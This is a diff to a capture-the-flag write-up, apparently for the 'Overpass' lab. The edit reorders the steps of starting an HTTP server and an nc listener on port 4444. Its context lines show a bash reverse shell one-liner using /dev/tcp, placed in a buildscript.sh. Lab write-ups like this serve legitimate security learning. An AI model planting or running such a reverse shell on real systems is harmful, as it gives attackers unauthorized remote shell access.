@@ -84,18 +84,19 @@ Create a buildscript.sh in the src folder and paste the reverse shell in there.
 ```
 bash -i >& /dev/tcp/<your_ip>/4444 0>&1
 ```
-We listen on port 4444 for a connection from the reverse shell.
 
-```
-nc -lnvp 4444
-```
-![nc](/thm/images/overpass/nc.png)
-
-At the same time we start the http server and wait.
+We start the http server.
 
 ```
 sudo python -m SimpleHTTPServer 80
 ```
 ![http](/thm/images/overpass/httpserver.png)
+
+At the same time we listen on port 4444 for a connection from the reverse shell.
+
+```
+nc -lnvp 4444
+```
+![nc](/thm/images/overpass/nc.png)
 
 Hope this writeup helped you!
